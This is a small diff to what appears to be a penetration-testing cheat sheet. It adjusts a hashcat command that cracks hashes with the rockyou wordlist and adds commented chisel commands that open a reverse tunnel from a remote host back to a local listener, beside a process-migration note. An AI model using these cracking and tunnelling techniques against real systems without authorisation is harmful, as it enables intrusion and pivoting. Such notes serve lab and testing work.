@@ -138,5 +138,8 @@ sudo password
 migrate <process_id>
 
 # cracking hash with hashcat
-hashcat -a -m 400 hashfile /usr/share/wordlists/rockyou.txt 
+hashcat -a -m 400 hashfile /usr/share/wordlists/rockyou.txt
+
+# chisel server -p 3477 --reverse # local
+# chisel client <localip:localport> R:8000:127.0.0.1:8000/tcp # remote
 ```
